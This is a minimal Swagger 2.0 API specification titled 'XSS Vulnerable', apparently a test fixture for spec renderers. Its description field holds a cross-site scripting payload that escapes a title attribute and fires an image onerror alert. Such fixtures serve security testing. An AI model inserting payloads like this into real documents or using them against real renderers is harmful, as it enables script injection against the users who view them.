swagger: '2.0'
info:
  version: "0.0.1"
  title: XSS Vulnerable
  description: '<a /title="</title><img src onerror=alert(2025)>">'
paths:
  /:
    get:
      responses:
        200:
          description: Successful response
